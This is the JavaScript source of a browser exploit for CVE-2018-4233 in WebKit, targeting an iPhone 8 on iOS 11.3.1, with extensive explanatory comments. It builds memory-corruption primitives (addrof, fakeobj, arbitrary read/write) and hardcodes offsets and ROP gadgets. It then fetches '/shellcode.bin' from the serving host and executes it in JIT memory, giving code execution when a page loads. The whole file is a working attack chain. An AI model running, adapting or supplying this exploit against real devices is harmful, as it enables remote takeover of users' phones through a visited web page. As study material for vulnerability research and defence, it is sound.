/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 * The second stage is currently Ian Beer's empty_list kernel exploit,
 * adapted to use getattrlist() instead of fgetattrlist().
 *
 * Thanks to qwerty for some Mach-O tricks.
 *
 * Offsets hardcoded for iPhone 8, iOS 11.3.1.
 */

print = alert
ITERS = 10000
ALLOCS = 1000

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000

// the below conversion functions do the following:
// we supply a double like 0xaabbccdd11223344.0
// and it produces a double which is when
// encoded into 64-bit look like this
// 44 33 22 11 dd cc bb aa, and back.
// 
// One problem we might face with this is that javascript doubles support
// up to 15 digit integers without period or exponent notation.
//
// So if we use a value which has more then 15 digits javascript
// engine is going to take whatever fits into 15 digits, use it as a base
// and apply exponent to shift, this way we will end up with
// zeros instead of some least significant digits.
//
// For instance: 0x11223344aabbccdd is going to become
// 0x11223344aabbcd00 (has 0x11223344aabbcd as the base and an exponent)
// 
// Another issue we might face is converting values falling
// under NaNs. (from 0x7ff0000000000000 till 0x7ff8000000000000, 
// and from 0xfff0000000000000 till 0xfff8000000000000)
//
// For instance, when converting 0x7ff01122aabb0000 (it can be represented
// using exponent notation, so the previous case does not apply).
// It gets converted to a NaN 0x7ff8000000000000 when 
// we read it from Float64Array.
//
// This conversion should always succeed for the
// pointers used by WebKit.
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}


function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

function fail(x) {
    print('FAIL ' + x)
    throw null
}

counter = 0

/* 
 CVE-2018-4233
 Issue on the bug tracker: https://bugs.webkit.org/show_bug.cgi?id=184013
 commit: https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a#diff-1a4598cdaa4bf5e3b8f84e8b3d7d037e

 To better understand the details of the bug and the exploit itself refer to 
 http://www.phrack.org/papers/attacking_javascript_engines.html and
 runtime/JSCJSValue.h file of JavaScriptCore. 

 The essence of this kind of bugs is well explained in a blog post:
 https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons
 For this case you can think of a call to new Wrapper(o) as go function from the post,
 and get of Proxy as a side effect.

 Refer to the commits to
 https://github.com/WebKit/webkit/commits/master/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h
 There has been whole bunch of similar issues lately, test yourself and see if you
 can identify more in the history.
*/
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    // the constructor is called after Proxy get
    var Constructor${counter} = function(o) { ${constr} }

    var hack = false

    var Wrapper = new Proxy(Constructor${counter}, {
        // this one is called first, as a side effect
        get: function() {
            // trigger side effect is hack is true
            if (hack) {
                // To leak address of an object we optimize this function
                // as if o stays ArrayWithDouble, then during a side effect
                // set o[0] to object val, changing it to ArrayWithContiguous.
                // Optimized constructor still thinks o is ArrayWithDouble
                // and retrieves o[0] as a double, which is now a JSValue (pointer)
                // of val object.
                //
                // To materialize an object we change the type of o 
                // to ArrayWithContiguous during side effect, by setting o[0] = {},
                // then in constructor, which still thinks o is ArrayWithDouble,
                // set o[0] to double val. Them we read it as a JSValue from o[0],
                // in the main not optimized code which is going to properly 
                // consult the cell to determine the array type (now it is
                // ArrayWithContiguous after the side effect modifications).
                ${modify}
            }
        }
    })

    // force optimization for the constructor 
    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    // call optimized constructor with Proxy side effect 
    var bar = new Wrapper(o)
    ${res}
    `)
}

var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf)
var u8_buffer = new Uint8Array(workbuf)
var shellcode_length

/*
 First we want to setup primitives leaking arbitrary javascript object
 address and materializing given pointer as a javascript object.
*/
function pwn() {
    var stage1 = {
        // returns the address of object @victim
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },

        // materializes a javascript object at address @addr
        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
        },

        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                fail(1)
            }
        },
    }

    // Sanity check
    stage1.test()

    // spray 1000 structure to be able to 
    // guess structure id for our fake objects.
    // We want to keep references to the object, so structures 
    // don't get destroyed during garbage collection.
    var structure_spray = []
    for (var i = 0; i < 1000; ++i) {
        // Place 0xffffffff as the last inlined property,
        // so we get a proper butterfly header when we use one of
        // these objects pointer as a butterfly.
        // Since all the objects allocated one after another from
        // some point, the last inlined property value is going to
        // act as a butterfly header with 0 used items and 0xffffffff as length.

        // those properties are all inlined
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
        // supposedly this property goes to the butterfly
        ary['prop'+i] = 1
        structure_spray.push(ary)
    }

    // we are going to set this object as a butterfly of our
    // fake object, and use it to write stuff to the utility object
    // for our stage2 leak/materialize, read/write primitives.
    var manager = structure_spray[500]
    var leak_addr = stage1.addrof(manager)
    //print('leaking from: '+ hex(leak_addr))

    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr))
            }
            res = eval(expr)
        } while (stage1.addrof(res) < leak_addr)
        return res
    }

    var unboxed_size = 100

    // Allocate a "boxed" array, ArrayWithContiguous in terms of JavaScriptCore and
    // "unboxed" array aka ArrayWithDouble.
    // 
    // Those two are going to be used to build leak address and materialize primitives
    // for javascrip objects.
    //
    // The idea is to have two arrays, one with doubles and another one with objects,
    // to share the same butterfly. So we can write a double to one and then read 
    // it at the same position as an object from the other one. 
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    // allocate "boxed" array after, in jsc those are called ArrayWithContiguous
    var boxed = alloc_above_manager('[{}]')

    // This is an object we are going to use for read/write.
    // To write to an @address, we are going to set victim's butterfly
    // to @address + 0x10. So the @address + 0x10 is going to be the first
    // array elements, @address + 8 is going to be butterfly header,
    // so @address is going to point to the first property. When the properties
    // are written JavaScriptCore only consults the structure, butterfly header 
    // is irrelevant for that. So when writing/reading to the only property,
    // we essentially are going to write/read the value to the @address. 
    //
    // This way we can safely read/write pretty much any value, except once falling
    // under double NaN values. But those might be ok as well, as long as 
    // we don't do any conversions on them.
    var victim = alloc_above_manager('[]')

    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337
    function victim_write(val) {
        victim.p0 = val
    }
    function victim_read() {
        return victim.p0
    }

    // we allocated 1000 structures, indexes should have started 
    // somewhere between 200-300, so 0x200 should be structure id
    // for one of the allocated objects.
    i32[0] = 0x200                // Structure ID
    // Fake JSCell metadata, adjusted for boxing
    // We are going to write cell as an encoded double.
    // Syb 0x1000000000000ll from the final double, so then it's 
    // converted to JSValue we get exactly our desired cell value.
    i32[1] = 0x01082007 - 0x10000 
    // Build a fake object in inlined properties.
    var outer = {
        p0: 0,
        // Padding, so that the rest of inline properties are 16-byte aligned
        //
        // As on of the mitigation for Specter/Meltdown webkit developers
        // introduced index masking. For instance, an object which used to look like
        // this
        // | cell | butterfly |
        // now looks like this
        // | cell | butterfly | mask |
        //
        // When the value is retrieved from the butterfly at index I, 
        // JavaScriptCore is going to apply the mask to the index
        // I = I & mask and then use the index. 
        //
        // That is where p0 comes from. The pointers in JavaScripCore are assumed
        // to be 16-bit aligned, so the lower bits are used as flags. If we start
        // our fake object with p0, we are going to have 8 at the end, which is
        // a way to indicate large allocations, seeing value like that JavaScripCore
        // will attempt to deal with a if it was coming from a large allocation, 
        // most likely leading to a crash in one way or another.
        //
        // Seems like for newer version of WebKit they are abandoning the masking,
        // so in those versions we should start building the fake object at p0.
        // in case we want to use this technique.
        p1: f64[0], // cell
        p2: manager, // butterfly
        p3: 0xfffffff, // Butterfly indexing mask
    }

    // get the address of p1 from outer, 
    // we need to skip | cell | butterfly | butterfly mask | p0 | 
    var fake_addr = stage1.addrof(outer) + 0x20
    //print('fake obj @ ' + hex(fake_addr))

    var unboxed_addr = stage1.addrof(unboxed)
    var boxed_addr = stage1.addrof(boxed)
    var victim_addr = stage1.addrof(victim)
    //print('leak ' + hex(leak_addr)
        //+ '\nunboxed ' + hex(unboxed_addr)
        //+ '\nboxed ' + hex(boxed_addr)
        //+ '\nvictim ' + hex(victim_addr))

    var holder = {fake: {}}
    holder.fake = stage1.fakeobj(fake_addr)

    // From here on GC would be uncool

    // Share a butterfly for easier boxing/unboxing.
    // Setup two array with shared butterfly for leak/materialize
    // as explained before.
        
    // Here we are writing relatively to manager, which is now
    // a butterfly of our fake object, which is ok, since 
    // we made sure all those objects were allocated after it.
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
    }
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
    }

    // better leak/materialize, read/write primitives.
    var stage2 = {
        addrof: function(victim) {
            // set JSValue at 0
            boxed[0] = victim
            // read it as a double 
            return f2i(unboxed[0])
        },

        fakeobj: function(addr) {
            // set as double into a ArrayWithDouble
            unboxed[0] = i2f(addr)
            // read it as a JSValue
            return boxed[0]
        },

        write64: function(where, what) {
            // set victims butterfly so its first property
            // points to where
            set_victim_addr(where)
            // materialize what as a JSValue, 
            // and set that value as victims first property.
            victim_write(this.fakeobj(what))
            reset_victim_addr()
        },

        read64: function(where) {
            // set victims butterfly so its first property
            // points to where
            set_victim_addr(where)
            // read a JSValue and convert it to a double,
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return res
        },

        write_non_zero: function(where, values) {
            for (var i = 0; i < values.length; ++i) {
                if (values[i] != 0)
                    this.write64(where + i*8, values[i])
            }
        },

        test: function() {
            this.write64(boxed_addr + 0x10, 0xfff) // Overwrite index mask, no biggie
            if (0xfff != this.read64(boxed_addr + 0x10)) {
                fail(2)
            }
        },

        forge: function(values) {
            for (var i = 0; i < values.length; ++i)
                unboxed[1 + i] = i2f(values[i])
            return shared_butterfly + 8
        },

        clear: function() {
            outer = null
            holder.fake = null
            for (var i = 0; i < unboxed_size; ++i)
                boxed[0] = null
        },
    }

    // Test read/write
    stage2.test()

    // In the last stage we are going to overwrite div element's wrapper
    // vtable, and call one the virtual function redirecting execution
    // to our rop chain.
    var wrapper = document.createElement('div')

    var wrapper_addr = stage2.addrof(wrapper)
    var el_addr = stage2.read64(wrapper_addr + 0x20)
    var vtab_addr = stage2.read64(el_addr)

    // Various offsets here
    var slide = stage2.read64(vtab_addr) - 0x189c9a808
    var disablePrimitiveGigacage = 0x18851a7d4 + slide
    var callbacks = 0x1b335bd28 + slide
    var g_gigacageBasePtrs = 0x1b1d08000 + slide
    var g_typedArrayPoisons = 0x1b335d720 + slide
    var longjmp = 0x180b126e8 + slide
    var dlsym = 0x18084ef90 + slide

    var startOfFixedExecutableMemoryPool = stage2.read64(0x1b335d0b8 + slide)
    var endOfFixedExecutableMemoryPool = stage2.read64(0x1b335d0c0 + slide)
    var jitWriteSeparateHeapsFunction = stage2.read64(0x1b335d0c8 + slide)
    var useFastPermisionsJITCopy = stage2.read64(0x1b1d04018 + slide)

    var ptr_stack_check_guard = 0x1ac3efc40 + slide

    // ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
    var pop_x8 = 0x18d2f6564 + slide

    // CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    var pop_x2 = 0x18409ddbc + slide

    // see jitcode.s
    var linkcode_gadget = 0x187bd18c8 + slide

    //print('base @ ' + hex(base)
        //+ '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
        //+ '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
        //+ '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
        //+ '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
        //+ '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
        //+ '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
        //+ '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
        //)

    // Depending on the version, WebKit might have three options
    // regarding how it handles writing of jit code.
    //
    // 1. Use rwx memory and directly copying the code.
    //
    // 2. In there is support for executable only memory. 
    //    Have two mappings rx at address RX and rw at address RW. At the start
    //    webkit generates code for a function which accepts offset, source and
    //    size. The function, when called, copies size bytes from
    //    source to RW + offset. The area where the function is located marked
    //    as executable only, RW is hardcoded inside of the function. So the
    //    RW is never explicitly used. In that case instead of directly copying
    //    shellcode you need to call that function with proper parameters, most likely
    //    via a rop chain.
    //
    // 3. Using ARM processor feature which allow to quickly switch rwx
    //    mapping to rw or rx. In that case to install jit code JavaScriptCore
    //    is going to call os_thread_self_restrict_rwx_to_rw 
    //    switching rwx region (which is atm is rx) to rw, copy the code into
    //    the region, switch back to rx by calling os_thread_self_restrict_rwx_to_rx.
    //    Similar to 2 we want to call the code snippet in JavaScriptCore which 
    //    does that via rop chain.
    // 
    //    The exploit handles only the case 3, which is used on all new
    //    iPhones starting from iPhone8.
    if (!useFastPermisionsJITCopy || jitWriteSeparateHeapsFunction) {
        // Probably an older phone, should be even easier
        fail(3)
    }
    var callback_vector = stage2.read64(callbacks)

    // This is where the issues described for i2f, f2i might come into play,
    // if poison fall under those limitation seems like we might get a wrong value.
    var poison = stage2.read64(g_typedArrayPoisons + 6*8)
    // leak backing store from an ArrayBuffer.
    var buffer_addr = xor(stage2.read64(stage2.addrof(u32_buffer) + 0x18), poison)

    var shellcode_src = buffer_addr + 0x4000
    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000
    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
        fail(4)
    }
    // This write should never be affected by the i2f, f2i issues
    // and always succeed, since the dlsym pointer never fall under
    // "bad" values.
    stage2.write64(shellcode_src + 4, dlsym)

    // setup a stack for our rop chain, which copies our shellcode
    // into RWX region used got jit, and then redirects execution to 
    // it.
    var fake_stack = [
        0,
        shellcode_length,  // x2
        0,

        pop_x8,

        0, 0, 0, 0, 0,
        shellcode_dst, // x8
        0, 0, 0, 0,
        // same problem as for poison
        stage2.read64(ptr_stack_check_guard) + 0x58,

        linkcode_gadget,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

        shellcode_dst,
    ]

    // Set up fake vtable at offset 0
    u32_buffer[0] = longjmp % BASE32
    u32_buffer[1] = longjmp / BASE32

    // Set up fake stack at offset 0x2000
    for (var i = 0; i < fake_stack.length; ++i) {
        u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
        u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
    }

    stage2.write_non_zero(el_addr, [
        buffer_addr, // fake vtable
        0,
        shellcode_src, // x21
        0, 0, 0, 0, 0, 0, 0,
        0, // fp

        pop_x2, // lr
        0,
        buffer_addr + 0x2000, // sp
    ])
    //print('shellcode @ ' + hex(shellcode_dst))
    print('see you on the other side')
    wrapper.addEventListener('click', function(){})
}

function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}

function go() {
    fetch('/shellcode.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try {
                shellcode_length = buffer.byteLength
                if (shellcode_length > 0x1000000) {
                    fail(5)
                }
                u8_buffer.set(new Uint8Array(buffer), 0x4000)
                //print('got ' + shellcode_length + ' bytes of shellcode, pwning')
                pwn()
            } catch (e) {
                print_error(e)
            }
        })
    })
}
